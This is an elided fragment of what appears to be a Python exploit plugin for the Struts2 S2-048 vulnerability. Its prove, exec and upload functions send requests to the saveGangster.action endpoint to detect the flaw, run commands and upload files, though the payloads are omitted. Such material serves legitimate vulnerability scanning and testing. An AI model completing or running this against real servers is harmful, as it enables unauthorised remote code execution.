...
def prove(data):
    ...
    if data['url'] != None:
        ...
        try:
            ...
            res = curl('get', data['base_url'] + '/struts2-showcase/integration/saveGangster.action', params=_data)
            if poc_key in res.headers or poc_key in res.text:
                data['flag'] = 1
                data['data'].append({"poc": prove_poc})
                data['res'].append({"info": data['url'], "key": "struts2_048"})
        except:
            pass
    return data
...
def exec(data=None):
    ...
    if data['url'] != None:
        ...
        try:
            ...
            res = curl('post', data['base_url'] + '/struts2-showcase/integration/saveGangster.action', data=_data).text
            data['flag'] = 1
...
def upload(data=None):
    ...
    if data['url'] != None:
        ...
        try:
            ...
            curl('post', data['base_url'] + '/struts2-showcase/integration/saveGangster.action', data=_data)
            data['flag'] = 1
